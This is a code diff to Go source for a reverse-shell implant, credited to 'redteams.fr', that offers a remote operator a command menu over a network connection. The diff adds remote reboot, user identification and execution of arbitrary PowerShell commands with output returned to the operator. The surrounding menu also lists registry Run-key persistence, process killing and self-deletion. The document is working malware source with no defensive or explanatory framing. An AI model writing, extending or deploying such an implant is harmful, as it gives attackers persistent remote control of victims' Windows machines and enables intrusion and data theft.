@@ -34,7 +34,7 @@ func reverseShell(serverAddress string, waitTime time.Duration) {
 		}
 
 		for {
-			menu := "\nrevShell by redteams.fr\n1: Create an empty file on the desktop\n2: Show a MessageBox\n3: Persist in RunOnce registry key (using registry package)\n4: List processes with PIDs\n5: Kill process (requires PID)\n6: Rickroll\n7: Delete and Exit\n"
+			menu := "\nrevShell by redteams.fr\n1: Create an empty file on the desktop\n2: Show a MessageBox\n3: Persist in Run registry key\n4: List processes with PIDs\n5: Kill process (requires PID)\n6: Rickroll\n7: Self delete and Exit\n8: Reboot\n9: GetUID\n10: Execute PowerShell command\n"
 			conn.Write([]byte(menu))
 
 			buffer, _ := bufio.NewReader(conn).ReadString('\n')
@@ -82,7 +82,35 @@ func reverseShell(serverAddress string, waitTime time.Duration) {
 				if err != nil {
 					conn.Write([]byte(fmt.Sprintf("Failed to start delete command: %v\n", err)))
 				}
-				os.Exit(0)				
+				os.Exit(0)
+			case "8":
+				cmd := exec.Command("shutdown", "/r", "/t", "0")
+				err := cmd.Run()
+				if err != nil {
+					conn.Write([]byte(fmt.Sprintf("Failed to reboot: %v\n", err)))
+				}
+			case "9":
+				cmd := exec.Command("whoami")
+				output, err := cmd.Output()
+				if err != nil {
+					conn.Write([]byte(fmt.Sprintf("Failed to execute whoami: %v\n", err)))
+				} else {
+					conn.Write([]byte(fmt.Sprintf("Current user: %s\n", output)))
+				}						
+			case "10":
+				conn.Write([]byte("Enter PowerShell command to execute: "))
+				psCommandBuffer, _ := bufio.NewReader(conn).ReadString('\n')
+				psCommand := strings.TrimSpace(psCommandBuffer)
+
+				cmd := exec.Command("powershell", "-command", psCommand)
+				output, err := cmd.Output()
+				if err != nil {
+					conn.Write([]byte(fmt.Sprintf("Failed to execute PowerShell command: %v\n", err)))
+				} else {
+					conn.Write([]byte(fmt.Sprintf("Output: %s\n", output)))
+				}
+				
+				
 			default:
 				conn.Write([]byte("Invalid option\n"))
 			}
